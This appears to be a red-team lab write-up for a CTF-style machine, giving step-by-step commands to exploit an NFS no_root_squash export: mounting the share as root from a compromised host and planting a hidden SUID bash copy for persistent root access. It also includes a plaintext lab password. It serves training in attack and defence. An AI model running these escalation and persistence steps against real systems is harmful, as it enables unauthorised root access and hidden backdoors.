# Red Team — M5: sigint-archive (FINAL)

**Vulnerability:** NFS `no_root_squash` → SUID bash
**Technique:** T1548.001 — Setuid and Setgid
**Entry:** SSH `archivist : Arch1v3@D3S3RT` from M4

---

## Step 1 — SSH Login

```bash
ssh archivist@<M5-IP>
# Password: Arch1v3@D3S3RT
```

---

## Step 2 — Enumerate NFS Exports

```bash
# From M5 (or from attack machine / M4 with root):
showmount -e <M5-IP>
# Output:
# Export list for <M5-IP>:
# /opt/sigint/classified-archive *
```
<img width="1163" height="752" alt="image" src="https://github.com/user-attachments/assets/91428885-ba6e-483a-8020-09cc08c42138" />

---

## Step 3 — Mount the NFS Share AS ROOT from M4

The key is `no_root_squash` — when you mount this share from a client machine
where you are root, your root privileges carry over to the server's filesystem.

```bash
# On M4 (where you have root via pickle RCE):
apt-get install -y nfs-common 2>/dev/null

mkdir -p /mnt/archive
mount -t nfs <M5-IP>:/opt/sigint/classified-archive /mnt/archive

# Verify you can see root-owned file:
ls -la /mnt/archive/CLASSIFIED_FLAG.txt
# -rw------- 1 root root ... (root-owned on server)

# As root on M4, you can read it:
cat /mnt/archive/CLASSIFIED_FLAG.txt
```

---

## Step 4 — Persistent SUID Bash (Alternative)

For a persistent escalation vector on M5 itself:

```bash
# On M4 (as root), with NFS mounted:
cp /bin/bash /mnt/archive/.hidden_bash
chmod +s /mnt/archive/.hidden_bash
ls -la /mnt/archive/.hidden_bash
# -rwsr-xr-x 1 root root ... (SUID bit set because we wrote as root)

# On M5 (as archivist):
/opt/sigint/classified-archive/.hidden_bash -p
# -p flag preserves effective UID = root
whoami     # root
cat /opt/sigint/classified-archive/CLASSIFIED_FLAG.txt
```

---

## Step 5 — Read Final Flag

```bash
cat /opt/sigint/classified-archive/CLASSIFIED_FLAG.txt
# FLAG{xxxxxxxxxxxxxxxx_nfs_squash_archive_pwned}
```

**DOMAIN COMPROMISE COMPLETE**
**FOB KESTREL SIGINT ARCHIVE BREACHED**

---

## Full Kill Chain Summary

```
M1 (SSRF)      → credentials for M2 monitor
M2 (cmd inject) → SSH key for M3 gateway
M3 (sudo node) → API token for M4 processor
M4 (pickle RCE) → password for M5 archive
M5 (NFS squash) → FINAL FLAG
```
